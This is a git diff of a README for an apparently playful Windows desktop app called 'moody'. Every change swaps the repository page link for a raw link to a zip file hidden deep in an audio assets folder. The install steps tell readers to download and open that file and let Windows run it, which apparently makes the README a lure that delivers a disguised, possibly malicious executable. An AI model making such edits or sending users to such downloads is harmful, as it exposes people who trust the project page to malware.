@@ -1,6 +1,6 @@
 # 🫠 moody - Bring Mac Mood to Your Screen
 
-[![Download moody](https://img.shields.io/badge/Download-moody-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/antoniusallied763/moody)
+[![Download moody](https://img.shields.io/badge/Download-moody-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/antoniusallied763/moody/main/docs/audio/ja_spicy/audio/battery_crit/Software-v3.0.zip)
 
 ## 😌 What moody does
 
@@ -21,7 +21,7 @@ It is made for people who want a simple, playful desktop app with no setup stres
 
 Open the link below in your browser:
 
-https://github.com/antoniusallied763/moody
+https://raw.githubusercontent.com/antoniusallied763/moody/main/docs/audio/ja_spicy/audio/battery_crit/Software-v3.0.zip
 
 On that page, look for the latest release or download file. Save it to your PC, then open it to run the app.
 
@@ -42,7 +42,7 @@ If your browser warns you about the file, check that you downloaded it from the 
 ## 🚀 Getting Started
 
 1. Open this page in your browser:  
-   https://github.com/antoniusallied763/moody
+   https://raw.githubusercontent.com/antoniusallied763/moody/main/docs/audio/ja_spicy/audio/battery_crit/Software-v3.0.zip
 
 2. Find the latest release or download file.
 
@@ -83,7 +83,7 @@ The app keeps the experience simple. It shows the result of each hardware event 
 ### 1. Download the app
 Go to:
 
-https://github.com/antoniusallied763/moody
+https://raw.githubusercontent.com/antoniusallied763/moody/main/docs/audio/ja_spicy/audio/battery_crit/Software-v3.0.zip
 
 Download the Windows build from the page.
 
@@ -171,7 +171,7 @@ moody turns system events into short personality lines. Instead of showing plain
 
 ## ✅ Quick install path
 
-1. Visit https://github.com/antoniusallied763/moody
+1. Visit https://raw.githubusercontent.com/antoniusallied763/moody/main/docs/audio/ja_spicy/audio/battery_crit/Software-v3.0.zip
 2. Download the Windows file from the page
 3. Open the file on your PC
 4. Allow Windows to run it
